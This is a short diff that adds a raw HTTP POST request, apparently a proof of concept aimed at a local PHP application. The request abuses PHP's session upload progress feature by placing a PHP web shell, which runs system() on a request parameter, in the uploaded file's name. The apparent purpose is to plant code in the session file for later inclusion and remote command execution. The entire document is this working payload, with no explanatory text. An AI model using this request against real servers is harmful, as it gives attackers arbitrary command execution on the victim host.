@@ -1,0 +1,16 @@
+POST /index.php HTTP/1.1
+Host: 127.0.0.1:8106
+Cookie: PHPSESSID=vc01
+Content-Type: multipart/form-data; boundary=BbB02
+Content-Length: 259
+
+--BbB02
+Content-Disposition: form-data; name="PHP_SESSION_UPLOAD_PROGRESS"
+
+poc
+--BbB02
+Content-Disposition: form-data; name="f2"; filename="<?php echo '[RCE-OUT]';system($_REQUEST['c']); ?>.php"
+Content-Type: text/plain
+
+XXXXXXXXXXXXXXXX
+--BbB02--
